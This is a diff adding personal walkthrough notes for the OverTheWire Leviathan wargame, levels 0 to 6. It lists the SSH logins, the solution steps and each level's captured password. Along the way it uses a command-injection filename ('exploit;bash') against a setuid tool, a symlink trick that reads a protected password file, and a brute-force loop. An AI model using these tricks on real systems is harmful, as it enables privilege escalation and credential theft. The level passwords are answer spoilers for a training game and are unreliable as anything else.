@@ -1,0 +1,89 @@
+### Leviathan
+Leviathan
+
+/etc/leviathan_pass
+
+--->lvl0
+ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+leviathan0
+-----
+cd .backup
+cat bookmarks.html | grep leviathan1
+rioGegei8m
+-----
+
+
+--->lvl1
+ssh leviathan1@leviathan.labs.overthewire.org -p 2223
+-----
+running 'ltrace ./check'  shows thsr it checks inputs agaisnt word 'sex' so run the check file with password sex and then cat the password file for leviathan2:
+ougahZi8Ta
+-----
+
+
+-->lvl2
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+-----
+create a file: 'exploit;bash' (with the quote) and try printfile on that.
+you will still get a error message but you are already at elevated shell.
+-----
+cat /etc/leviathan_pass/leviathan3
+Ahdiemoo1j
+-----
+
+
+
+--->lvl3
+ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+-----
+ltrace ./level3   shows us the correct password for the file: snlprintf.
+run the ./level3 file and type the pass
+-----
+cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+-----
+
+
+--->lvl4
+ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+-----
+look into .trash folder and run the bin file.  it will give you binary pass, go oinline and translate it:
+Tith4cokei
+-----
+
+
+--->lvl5
+running the file leviatahn5 shows that its looking for file.log in temp so we creat a
+symbolic link to that file from password file nad run it
+-----
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+-----
+./leviathan5
+UgaoFee4li
+-----
+
+
+--->lvl6
+as the file leviathan6 needs a 4 dfigit code so we brute force it
+-----
+for x in $(seq 0000 9999); do ./leviathan6 $x; done
+-----
+ahy7MaeBo9
+-----
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
